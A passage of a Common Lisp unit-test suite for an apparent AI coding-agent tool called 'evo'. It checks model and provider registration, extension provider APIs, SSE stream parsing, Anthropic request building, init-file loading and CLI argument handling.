  (check-signals "unknown model id signals" (find-model "no-such-model"))
  (check "unknown model error names register-model"
         (handler-case (progn (find-model "no-such-model") nil)
           (error (e) (search "register-model" (format nil "~a" e)))))
  (check-signals "unknown :api signals at registration"
                 (register-model* "bad" :provider :x :api :no-such-api
                                  :context-window 1 :max-output 1))
  (check "providers seeded from API defaults"
         (equal "https://api.anthropic.com"
                (pget (provider-config :anthropic) :base-url)))
  (register-provider* :anthropic :base-url "http://127.0.0.1:1")
  (check "provider re-register merges field-wise"
         (equal "http://127.0.0.1:1" (pget (provider-config :anthropic) :base-url)))
  (register-provider* :custom :base-url "http://x" :api-key "k")
  (check "custom provider literal api-key"
         (equal "k" (pget (provider-config :custom) :api-key)))
  (check-signals "unregistered provider signals" (provider-config :no-such-provider))
  (check-signals "provider without base-url signals"
                 (progn (register-provider* :keyless :api-key "k")
                        (provider-config :keyless)))
  (reset-user-registries)
  (check "reset clears models" (null (all-models)))
  (check "reset re-seeds anthropic"
         (equal "https://api.anthropic.com"
                (pget (provider-config :anthropic) :base-url)))
  (check "reset re-seeds openai"
         (equal "https://api.openai.com"
                (pget (provider-config :openai) :base-url))))

(defun test-apis ()
  (check "find-api anthropic" (find-api :anthropic-messages))
  (check "find-api openai" (find-api :openai-responses))
  (check-signals "unknown api signals" (find-api :no-such-api))
  (check "anthropic thinking-param is a budget"
         (= 8192 (thinking-param (find-api :anthropic-messages) :medium)))
  (check "anthropic thinking off"
         (null (thinking-param (find-api :anthropic-messages) :off)))
  (check "openai thinking-param is an effort string"
         (equal "medium" (thinking-param (find-api :openai-responses) :medium)))
  (check "openai thinking off"
         (null (thinking-param (find-api :openai-responses) :off)))
  (check "endpoint paths"
         (and (equal "/v1/messages" (endpoint-path (find-api :anthropic-messages)))
              (equal "/v1/responses" (endpoint-path (find-api :openai-responses))))))

;;; Extension-defined provider APIs (a new wire protocol from userspace).

;; A minimal API: implements the protocol, seeds nothing.  The common case
;; for an extension, and the one that used to break /reload.
(defclass bare-fixture-api (provider-api) ())
(defmethod endpoint-path ((api bare-fixture-api)) "/v1/bare")
(defmethod thinking-param ((api bare-fixture-api) level)
  (declare (ignore level)) nil)

;; A self-seeding API: supplies the provider defaults too, so an env key
;; alone is enough config.
(defclass seeding-fixture-api (provider-api) ())
(defmethod endpoint-path ((api seeding-fixture-api)) "/v1/seeded")
(defmethod default-provider-key ((api seeding-fixture-api)) :fixture-co)
(defmethod default-base-url ((api seeding-fixture-api)) "https://api.fixture.co")
(defmethod default-api-key-env ((api seeding-fixture-api)) "FIXTURE_CO_KEY")

(defun test-extension-apis ()
  "A provider API is an extension point, not a kernel privilege: everything
here must be reachable through the public EVO package with no ::."
  ;; The public surface is what makes this real — verify the protocol is
  ;; actually exported from EVO, and is the *same* symbol as EVO.PROVIDER's
  ;; (imported, not shadowed), so a defmethod in userspace specializes the
  ;; generic the kernel actually calls.
  (dolist (name '("PROVIDER-API" "REGISTER-API" "FIND-API" "API-KEYS"
                  "ENDPOINT-PATH" "AUTH-HEADERS" "BUILD-REQUEST" "PARSE-STREAM"
                  "THINKING-PARAM" "PERFORM-REQUEST" "MAP-SSE-EVENTS"
                  "DEFAULT-PROVIDER-KEY" "DEFAULT-BASE-URL" "DEFAULT-API-KEY-ENV"))
    (check (format nil "EVO exports ~a" name)
           (eq :external (nth-value 1 (find-symbol name :evo))))
    (check (format nil "EVO:~a is EVO.PROVIDER:~a" name name)
           (eq (find-symbol name :evo) (find-symbol name :evo.provider))))
  ;; Registration validates eagerly.
  (check-signals "register-api rejects a non-keyword key"
                 (register-api "not-a-keyword" (make-instance 'bare-fixture-api)))
  (check-signals "register-api rejects a non-provider-api instance"
                 (register-api :bad-fixture "not-an-api"))
  (let ((original (copy-alist evo.provider::*apis*)))
    (unwind-protect
         (progn
           (register-api :bare-fixture (make-instance 'bare-fixture-api))
           (register-api :seeding-fixture (make-instance 'seeding-fixture-api))
           (check "extension api resolves via find-api" (find-api :bare-fixture))
           (check "extension api implements the protocol"
                  (equal "/v1/bare" (endpoint-path (find-api :bare-fixture))))
           (check "re-registering is idempotent (reloaded extension)"
                  (progn (register-api :bare-fixture (make-instance 'bare-fixture-api))
                         (= 1 (count :bare-fixture (api-keys)))))
           (check "a model may name an extension api"
                  (progn (register-model* "fixture-model" :provider :fixture-co
                                          :api :bare-fixture
                                          :context-window 100 :max-output 10)
                         (equal :bare-fixture (pget (find-model "fixture-model") :api))))
           ;; The /reload regression: reset-user-registries walks every
           ;; registered API.  Before the default methods existed this died
           ;; on the second boot with no-applicable-method.
           (check "reset survives an api that seeds nothing"
                  (progn (reset-user-registries) t))
           (check "an api with no default-provider-key seeds no provider"
                  (not (member :nil (mapcar #'car evo.provider::*providers*))))
           (check "a self-seeding extension api seeds its base-url"
                  (equal "https://api.fixture.co"
                         (pget (provider-config :fixture-co) :base-url)))
           (check "bundled apis still seed after an extension api is added"
                  (equal "https://api.anthropic.com"
                         (pget (provider-config :anthropic) :base-url)))
           (check "apis survive a reset (only models/providers are cleared)"
                  (find-api :bare-fixture)))
      (setf evo.provider::*apis* original)
      (reset-user-registries))))

(defun test-model-picker-labels ()
  "The /model choose box leads with the provider in an aligned column."
  (check "context window in k" (equal "200k" (evo.tui::format-context-window 200000)))
  (check "exactly 1M" (equal "1M" (evo.tui::format-context-window 1000000)))
  (check "fractional M" (equal "1.5M" (evo.tui::format-context-window 1500000)))
  (check "sub-1M stays k" (equal "272k" (evo.tui::format-context-window 272000)))
  (check "zero/unknown" (equal "0k" (evo.tui::format-context-window 0)))
  ;; Provider first, padded so the id column starts at the same offset for
  ;; every row; the renderer then pads the whole label to align the context.
  (let* ((models '((:id "claude-opus-5" :provider :anthropic)
                   (:id "gpt-5.6-luna" :provider :openai)
                   (:id "m" :provider :a)))
         (width (reduce #'max models
                        :key (lambda (m) (length (string (pget m :provider))))
                        :initial-value 0))
         (labels* (mapcar (lambda (m) (evo.tui::model-row-label m width)) models)))
    (check "provider leads the row"
           (evo.util:string-prefix-p "anthropic" (first labels*)))
    (check "provider is downcased"
           (evo.util:string-prefix-p "openai" (second labels*)))
    ;; The id is always the label's suffix, so its start column is exact.
    (check "id column aligns across providers"
           (let ((starts (mapcar (lambda (m l) (- (length l) (length (pget m :id))))
                                 models labels*)))
             (and (apply #'= starts)
                  (= (first starts) (+ width 2)))))
    (check "short provider is padded, not truncated"
           (equal "a          m" (third labels*)))
    (check "widest provider gets no padding, just the separator"
           (equal "anthropic  claude-opus-5" (first labels*)))))

(defun register-fixture-models ()
  "The unit suite's stand-in for init.lisp: the model registry ships empty."
  (register-model* "gpt-5.6-luna" :provider :openai :api :openai-responses
                   :context-window 272000 :max-output 128000 :thinking t)
  (register-model* "gpt-5.6-sol" :provider :openai :api :openai-responses
                   :context-window 272000 :max-output 128000 :thinking t))

;;; SSE transport framing

(defun test-sse-transport ()
  (let ((events nil))
    (with-input-from-string
        (in (format nil "event: a~%data: 1~%data: 2~%~%data: {\"x\":1}~%~%"))
      (check "transport: done at eof"
             (eq :done (map-sse-events
                        in (lambda (type data) (push (list type data) events))))))
    (let ((events (nreverse events)))
      (check "transport: multi-line data joined"
             (equal (first events) (list "a" (format nil "1~%2"))))
      (check "transport: typeless event"
             (equal (second events) (list nil "{\"x\":1}")))))
  (with-input-from-string (in (format nil "data: a~c~%~%data: b~%~%" #\Return))
    (let ((seen nil))
      (check "transport: :stop ends the loop"
             (eq :done (map-sse-events in (lambda (type data)
                                            (declare (ignore type))
                                            (push data seen)
                                            :stop))))
      (check "transport: CR trimmed, later events unread" (equal seen '("a")))))
  (with-input-from-string (in "data: tail")
    (let ((seen nil))
      (map-sse-events in (lambda (type data) (declare (ignore type)) (push data seen)))
      (check "transport: flush at eof without blank line" (equal seen '("tail")))))
  (with-input-from-string (in (format nil "data: x~%~%"))
    (check "transport: abort flag"
           (eq :aborted (map-sse-events in (lambda (type data)
                                             (declare (ignore type data)))
                                        :abort-flag (lambda () t))))))

;;; Anthropic request building

(defun test-anthropic-request ()
  (let* ((model '(:id "fixture-claude" :provider :anthropic :api :anthropic-messages
                  :context-window 200000 :max-output 64000 :thinking t))
         (history
           (list '(:role :user :content ((:type :text :text "go")))
                 ;; errored turn: elided by the handoff pass
                 '(:role :assistant :model "fixture-claude" :stop-reason :error
                   :usage (:input 0 :output 0 :cache-read 0 :cache-write 0)
                   :content ((:type :text :text "half")))
                 '(:role :assistant :model "fixture-claude" :stop-reason :tool-use
                   :usage (:input 1 :output 1 :cache-read 0 :cache-write 0)
                   :content ((:type :tool-call :id "tc_1" :name "bash"
                              :arguments (:command "ls"))))
                 '(:role :tool-result :tool-call-id "tc_1" :tool-name "bash"
                   :is-error nil :content ((:type :text :text "ok")))
                 '(:role :user :content ((:type :text :text "next")))))
         (tools (list (list :name "bash" :description "run"
                            :input-schema (schema->json-schema
                                           '(:object (:command :type :string :description "c"))))))
         (raw (build-request (find-api :anthropic-messages)
                             :model model :system "sys" :messages history
                             :tools tools :thinking-level :high))
         (req (com.inuoe.jzon:parse raw)))
    (flet ((jget (&rest keys) (apply #'evo.provider::jget req keys)))
      (check "anth req model + max_tokens"
             (and (equal (jget "model") "fixture-claude")
                  (= (jget "max_tokens") 64000)))
      (check "anth req streams" (eq (jget "stream") t))
      (check "anth req system block cached"
             (let ((sys (aref (jget "system") 0)))
               (and (equal (evo.provider::jget sys "text") "sys")
                    (evo.provider::jget sys "cache_control"))))
      (check "anth req thinking budget"
             (= (jget "thinking" "budget_tokens") 16384))
      (check "anth req tools cached on last"
             (let ((tl (aref (jget "tools") 0)))
               (and (equal (evo.provider::jget tl "name") "bash")
                    (evo.provider::jget tl "cache_control"))))
      (let ((messages (jget "messages")))
        (check "anth req errored turn elided, merged tail"
               (equal (map 'list (lambda (m) (evo.provider::jget m "role")) messages)
                      '("user" "assistant" "user")))
        (let ((blocks (evo.provider::jget (aref messages 2) "content")))
          (check "anth req tool-result + user merged"
                 (and (= 2 (length blocks))
                      (equal (evo.provider::jget (aref blocks 0) "type") "tool_result")
                      (equal (evo.provider::jget (aref blocks 1) "type") "text")))
          (check "anth req cache breakpoint on last block"
                 (evo.provider::jget (aref blocks (1- (length blocks)))
                                     "cache_control")))))
    (let ((raw2 (build-request (find-api :anthropic-messages)
                               :model model :system nil :messages history
                               :tools nil :thinking-level :off)))
      (check "anth req no thinking at :off" (not (search "budget_tokens" raw2))))))

;;; Init files (config-as-code) + CLI preflight

(defun test-init-files ()
  (let* ((home (evo-home))
         (global-init (merge-pathnames "init.lisp" home))
         (cwd (merge-pathnames "init-test-project/" home))
         (project-init (merge-pathnames ".evo/init.lisp" cwd)))
    (ensure-directory home)
    (ensure-directory (merge-pathnames ".evo/" cwd))
    (write-file-string
     global-init
     "(evo:register-model \"init-a\" :provider :anthropic :api :anthropic-messages
   :context-window 1000 :max-output 100)
(evo:set-setting :model \"init-a\")")
    (write-file-string
     project-init
     "(evo:register-model \"init-b\" :provider :openai :api :openai-responses
   :context-window 2000 :max-output 200)
(evo:set-setting :model \"init-b\")")
    (unwind-protect
         (progn
           (evo.kernel:boot-userspace :cwd cwd)
           (check "init: project setting overrides global"
                  (equal "init-b" (setting :model)))
           (check "init: global-then-project registration order"
                  (equal '("init-a" "init-b")
                         (mapcar (lambda (m) (pget m :id)) (all-models))))
           (evo.kernel:boot-userspace :cwd cwd)
           (check "init: re-boot is idempotent" (= 2 (length (all-models))))
           ;; A broken init file warns to stderr but doesn't abort the boot.
           (write-file-string project-init "(error \"boom\")")
           (let ((*error-output* (make-broadcast-stream)))
             (evo.kernel:boot-userspace :cwd cwd))
           (check "init: broken project init keeps global config"
                  (and (equal "init-a" (setting :model))
                       (equal '("init-a")
                              (mapcar (lambda (m) (pget m :id)) (all-models))))))
      (ignore-errors (delete-file global-init))
      (ignore-errors (delete-file project-init))
      (reset-user-registries)
      (reset-settings)
      (register-fixture-models))))

(defun test-preflight ()
  (reset-user-registries)
  (reset-settings)
  (let* ((journal (make-session-journal))
         (agent (make-agent :journal journal)))
    (check-signals "preflight: no model configured"
                   (evo.cli::preflight-model agent journal nil))
    (check "preflight error mentions init.lisp"
           (handler-case (progn (evo.cli::preflight-model agent journal nil) nil)
             (error (e) (search "init.lisp" (format nil "~a" e)))))
    (register-fixture-models)
    (set-setting :model "gpt-5.6-luna")
    (check "preflight passes with configured model"
           (progn (evo.cli::preflight-model agent journal nil) t))
    (set-setting :model "gone-model")
    (check-signals "preflight: unknown model id"
                   (evo.cli::preflight-model agent journal nil)))
  (reset-settings)
  (reset-user-registries)
  (register-fixture-models))

(defun test-parse-args ()
  (check "parse: thinking level keyword"
         (eq :high (getf (evo.cli::parse-args '("--thinking" "high")) :thinking)))
  (check-signals "parse: bogus thinking level"
                 (evo.cli::parse-args '("--thinking" "bogus")))
  (check-signals "parse: unknown flag" (evo.cli::parse-args '("--wat"))))

(defun run-all ()
  (let ((*pass* 0) (*fail* 0))
    (test-sexpr-io)
    (test-journal)
    (test-schema)
    (test-registry)
    (test-apis)
    (test-extension-apis)
    (test-model-picker-labels)
    (register-fixture-models)
    (test-sse)
    (test-sse-transport)
    (test-handoff)
    (test-anthropic-request)
    (test-openai-sse)
    (test-openai-request)
    (test-env-proxy)
    (test-init-files)
    (test-preflight)
    (test-parse-args)
    (test-editor)
    (test-input)
    (test-tui-compose)
    (test-resume-picker)
    (test-render-anchor)
    (test-display-width)
    (test-markdown)
    (test-user-prompt-block)
    (test-input-history)
    (test-mode-switching)
    (test-goal-budget)
    (test-templates)
    (test-compaction)
    (test-lore)
    (test-prompt-template)
    (test-tool-call-events)
    (test-tool-call-display)
    (test-plan-mode)
    (format t "~%~d passed, ~d failed~%" *pass* *fail*)
    (if (zerop *fail*) 0 1)))
